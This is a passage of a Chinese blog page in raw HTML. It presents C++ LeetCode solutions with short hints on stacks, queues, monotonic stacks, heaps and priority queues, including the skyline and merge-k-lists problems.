class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">searchMatrix</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; matrix, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = matrix[<span class="number">0</span>].<span class="built_in">size</span>(), m = matrix.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>, j = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; m &amp;&amp; j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (matrix[i][j] == target) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (matrix[i][j] &gt; target) --j;</span><br><span class="line">            <span class="keyword">else</span> ++i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：思考其性质，从右上角或左下角来进行搜索都是可以的。</p></li><li><p>题目四：<a href="https://leetcode.cn/problems/max-chunks-to-make-sorted">最多能完成排序的块</a><br>给定一个含有0到n整数的数组，每个整数只出现一次，求这个数组最多可以分割成多少个子数组，使得对每个子数组进行增序排序后，原数组也是增序的。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxChunksToSorted</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> maxArr = <span class="number">0</span>, chunks = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; arr.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            maxArr = <span class="built_in">max</span>(maxArr, arr[i]);</span><br><span class="line">            chunks += (maxArr == i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> chunks;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：如果当前最大值大于数组位置，则说明右边一定有小于数组位置的数字，需要把它也加入待排序的子数组；又因为数组只包含不重复的0到n，所以当前最大值一定不会小于数组位置。所以每当当前最大值等于数组位置时，假设为p，我们可以成功完成一次分割，并且其与上一次分割位置q之间的值一定是q+1到p的所有数字。</p></li></ul><h2 id="二、栈和队列"><a href="#二、栈和队列" class="headerlink" title="二、栈和队列"></a>二、栈和队列</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/implement-queue-using-stacks">用栈实现队列</a><br>尝试使用栈(stack)来实现队列(queue)。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyQueue</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; stack1;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; stack2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyQueue</span>() &#123;&#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (!stack<span class="number">1.</span><span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> temp = stack<span class="number">1.</span><span class="built_in">back</span>();</span><br><span class="line">            stack<span class="number">1.</span><span class="built_in">pop_back</span>();</span><br><span class="line">            stack<span class="number">2.</span><span class="built_in">push_back</span>(temp);</span><br><span class="line">        &#125;</span><br><span class="line">        stack<span class="number">1.</span><span class="built_in">push_back</span>(x);</span><br><span class="line">        <span class="keyword">while</span> (!stack<span class="number">2.</span><span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> temp = stack<span class="number">2.</span><span class="built_in">back</span>();</span><br><span class="line">            stack<span class="number">2.</span><span class="built_in">pop_back</span>();</span><br><span class="line">            stack<span class="number">1.</span><span class="built_in">push_back</span>(temp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> ret = stack<span class="number">1.</span><span class="built_in">back</span>();</span><br><span class="line">        stack<span class="number">1.</span><span class="built_in">pop_back</span>();</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> stack<span class="number">1.</span><span class="built_in">back</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> stack<span class="number">1.</span><span class="built_in">empty</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：简单题，两次先入后出等价于先入先出。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/min-stack">最小栈</a><br>设计一个最小栈，除了需要支持常规栈的操作外，还需要支持在O(1)时间内查询栈内最小值的功能。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MinStack</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; stack;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; minNumStack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MinStack</span>() &#123;&#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        stack.<span class="built_in">push_back</span>(val);</span><br><span class="line">        <span class="keyword">if</span> (minNumStack.<span class="built_in">empty</span>() || minNumStack.<span class="built_in">back</span>() &gt;= val)</span><br><span class="line">            minNumStack.<span class="built_in">push_back</span>(val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> ret = stack.<span class="built_in">back</span>();</span><br><span class="line">        stack.<span class="built_in">pop_back</span>();</span><br><span class="line">        <span class="keyword">if</span> (!minNumStack.<span class="built_in">empty</span>() &amp;&amp; ret == minNumStack.<span class="built_in">back</span>())</span><br><span class="line">            minNumStack.<span class="built_in">pop_back</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> stack.<span class="built_in">back</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> minNumStack.<span class="built_in">back</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：push()时判断一次，pop()时再判断一次即可，不需要每次都去排序或者进行插入删除操作。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/valid-parentheses">有效的括号</a><br>给定一个只由左右圆括号、花括号和方括号组成的字符串，求这个字符串是否合法。合法的定义是每一个类型的左括号都有一个右括号一一对应，且括号内的字符串也满足此要求。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isValid</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">char</span>&gt; stack;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c : s) &#123;</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;(&#x27;</span> || c == <span class="string">&#x27;[&#x27;</span> || c == <span class="string">&#x27;&#123;&#x27;</span>)</span><br><span class="line">                stack.<span class="built_in">push_back</span>(c);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (!stack.<span class="built_in">empty</span>() &amp;&amp;</span><br><span class="line">                    (c == <span class="string">&#x27;)&#x27;</span> &amp;&amp; stack.<span class="built_in">back</span>() == <span class="string">&#x27;(&#x27;</span> ||</span><br><span class="line">                    c == <span class="string">&#x27;]&#x27;</span> &amp;&amp; stack.<span class="built_in">back</span>() == <span class="string">&#x27;[&#x27;</span> ||</span><br><span class="line">                    c == <span class="string">&#x27;&#125;&#x27;</span> &amp;&amp; stack.<span class="built_in">back</span>() == <span class="string">&#x27;&#123;&#x27;</span>))</span><br><span class="line">                stack.<span class="built_in">pop_back</span>();</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stack.<span class="built_in">empty</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：运用一下栈的性质即可，因为这道题当左括号连续出现时也遵循先入后出的原则。</p></li></ul><h2 id="三、单调栈"><a href="#三、单调栈" class="headerlink" title="三、单调栈"></a>三、单调栈</h2><ul><li><p>算法解释：单调栈通过维持栈内值的单调递增(递减)性，在整体O(n)的时间内处理需要大小比较的问题。</p></li><li><p>题目：<a href="https://leetcode.cn/problems/daily-temperatures">每日温度</a><br>给定每天的温度，求对于每一天需要等几天才可以等到更暖和的一天。如果该天之后不存在更暖和的天气，则记为0。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dailyTemperatures</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; temperatures)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = temperatures.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; stack;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">res</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!stack.<span class="built_in">empty</span>() &amp;&amp; temperatures[stack.<span class="built_in">back</span>()] &lt;= temperatures[i]) </span><br><span class="line">                stack.<span class="built_in">pop_back</span>();</span><br><span class="line">            <span class="type">int</span> temp = stack.<span class="built_in">empty</span>() ? i : stack.<span class="built_in">back</span>();</span><br><span class="line">            res[i] = temp - i;</span><br><span class="line">            stack.<span class="built_in">push_back</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：虽然比较的是温度大小，但是栈应该存储下标方便用于进行天数差计算。</p></li></ul><h2 id="四、优先队列"><a href="#四、优先队列" class="headerlink" title="四、优先队列"></a>四、优先队列</h2><ul><li><p>算法解释：优先队列(priority queue)可以在O(1)时间内获得最大值，并且可以在O(log n)时间内取出最大值或插入任意值。<br>优先队列常常用堆(heap)来实现。堆是一个完全二叉树，其每个节点的值总是大于等于子节点的值。实际实现堆时，我们通常用一个数组而不是用指针建立一个树。这是因为堆是完全二叉树，所以用数组表示时，位置i的节点的父节点位置一定为(i-1)&#x2F;2，而它的两个子节点的位置又一定分别为2i+1和2i+2。<br>以下是堆的实现方法，其中最核心的两个操作是上浮和下沉：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Heap</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; heap_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Heap</span>() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 上浮。</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">swim</span><span class="params">(<span class="type">int</span> pos)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> next_pos = (pos - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span> (pos &gt; <span class="number">0</span> &amp;&amp; heap_[next_pos] &lt; heap_[pos]) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(heap_[next_pos], heap_[pos]);</span><br><span class="line">            pos = next_pos;</span><br><span class="line">            next_pos = (pos - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 下沉。</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">sink</span><span class="params">(<span class="type">int</span> pos)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = heap_.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> next_pos = <span class="number">2</span> * pos + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (next_pos &lt; n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (next_pos &lt; n - <span class="number">1</span> &amp;&amp; heap_[next_pos] &lt; heap_[next_pos + <span class="number">1</span>]) </span><br><span class="line">                ++next_pos;</span><br><span class="line">            <span class="keyword">if</span> (heap_[pos] &gt;= heap_[next_pos]) <span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">swap</span>(heap_[next_pos], heap_[pos]);</span><br><span class="line">            pos = next_pos;</span><br><span class="line">            next_pos = <span class="number">2</span> * pos + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入任意值：把新的数字放在最后一位，然后上浮。</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        heap_.<span class="built_in">push_back</span>(k);</span><br><span class="line">        <span class="built_in">swim</span>(heap_.<span class="built_in">size</span>() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除最大值：把最后一个数字挪到开头，然后下沉。</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        heap_[<span class="number">0</span>] = heap_.<span class="built_in">back</span>();</span><br><span class="line">        heap_.<span class="built_in">pop_back</span>();</span><br><span class="line">        <span class="built_in">sink</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得最大值。</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> heap_[<span class="number">0</span>]; &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>题目一：<a href="https://leetcode.cn/problems/merge-k-sorted-lists">合并 K 个升序链表</a><br>给定k个增序的链表，试将它们合并成一条增序链表。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// struct ListNode &#123;</span></span><br><span class="line"><span class="comment">//     int val;</span></span><br><span class="line"><span class="comment">//     ListNode *next;</span></span><br><span class="line"><span class="comment">//     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment">//     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment">//     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment">// &#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">swim</span><span class="params">(vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&amp; res, <span class="type">int</span> val, <span class="type">int</span> i)</span> </span>&#123;</span><br><span class="line">        res.<span class="built_in">push_back</span>(&#123;val, i&#125;);</span><br><span class="line">        <span class="type">int</span> pos = res.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> next = (pos - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span> (pos &gt; <span class="number">0</span> &amp;&amp; res[pos].first &lt; res[next].first) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(res[pos], res[next]);</span><br><span class="line">            pos = next;</span><br><span class="line">            next = (pos - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">sink</span><span class="params">(vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&amp; res)</span> </span>&#123;</span><br><span class="line">        res[<span class="number">0</span>] = res.<span class="built_in">back</span>();</span><br><span class="line">        res.<span class="built_in">pop_back</span>();</span><br><span class="line">        <span class="type">int</span> pos = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> next = pos * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> size = res.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">while</span> (next &lt; size) &#123;</span><br><span class="line">            <span class="keyword">if</span> (next &lt; size - <span class="number">1</span> &amp;&amp; res[next].first &gt; res[next + <span class="number">1</span>].first) ++next;</span><br><span class="line">            <span class="keyword">if</span> (res[pos].first &lt; res[next].first) <span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">swap</span>(res[pos], res[next]);</span><br><span class="line">            pos = next;</span><br><span class="line">            next = pos * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeKLists</span><span class="params">(vector&lt;ListNode*&gt;&amp; lists)</span> </span>&#123;</span><br><span class="line">        ListNode* res = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        ListNode* head = res;</span><br><span class="line">        vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; priority_queue;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; lists.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (lists[i] != <span class="literal">nullptr</span>)</span><br><span class="line">                <span class="built_in">swim</span>(priority_queue, lists[i]-&gt;val, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (!priority_queue.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">auto</span> [i, j] = priority_queue[<span class="number">0</span>];</span><br><span class="line">            ListNode *temp = <span class="keyword">new</span> <span class="built_in">ListNode</span>(i);</span><br><span class="line">            head-&gt;next = temp;</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">            <span class="built_in">sink</span>(priority_queue);</span><br><span class="line">            lists[j] = lists[j]-&gt;next;</span><br><span class="line">            <span class="keyword">if</span> (lists[j] != <span class="literal">nullptr</span>)</span><br><span class="line">                <span class="built_in">swim</span>(priority_queue, lists[j]-&gt;val, j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>题目二：<a href="https://leetcode.cn/problems/the-skyline-problem">天际线问题</a><br>给定建筑物的起止位置和高度，返回建筑物轮廓(天际线)的拐点。<br><img src="https://assets.leetcode.com/uploads/2020/12/01/merged.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">getSkyline</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; buildings) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; skylines;</span><br><span class="line">        priority_queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; pq;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>, cur_x, cur_h;</span><br><span class="line">        <span class="type">int</span> n = buildings.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n || !pq.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pq.<span class="built_in">empty</span>() || (i &lt; n &amp;&amp; buildings[i][<span class="number">0</span>] &lt;= pq.<span class="built_in">top</span>().second)) &#123;</span><br><span class="line">                cur_x = buildings[i][<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">while</span> (i &lt; n &amp;&amp; buildings[i][<span class="number">0</span>] &lt;= cur_x) &#123;</span><br><span class="line">                    pq.<span class="built_in">emplace</span>(buildings[i][<span class="number">2</span>], buildings[i][<span class="number">1</span>]);</span><br><span class="line">                    ++i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cur_x = pq.<span class="built_in">top</span>().second;</span><br><span class="line">                <span class="keyword">while</span> (!pq.<span class="built_in">empty</span>() &amp;&amp; pq.<span class="built_in">top</span>().second &lt;= cur_x) pq.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            cur_h = pq.<span class="built_in">empty</span>() ? <span class="number">0</span> : pq.<span class="built_in">top</span>().first;</span><br><span class="line">            <span class="keyword">if</span> (skylines.<span class="built_in">empty</span>() || cur_h != skylines.<span class="built_in">back</span>()[<span class="number">1</span>])</span><br><span class="line">                skylines.<span class="built_in">push_back</span>(&#123;cur_x, cur_h&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> skylines;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：非常难的一道题，我们可以使用优先队列储存每个建筑物的高度和右端(这里使用pair，其默认比较函数是先比较第一个值，如果相等则再比较第二个值)，从而获取目前会拔高天际线、且妨碍到前一个建筑物的右端端点的下一个建筑物。</p></li></ul><h2 id="五、双端队列"><a href="#五、双端队列" class="headerlink" title="五、双端队列"></a>五、双端队列</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/sliding-window-maximum">滑动窗口最大值</a><br>给定一个整数数组和一个滑动窗口大小，求在这个窗口的滑动过程中，每个时刻其包含的最大值。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> 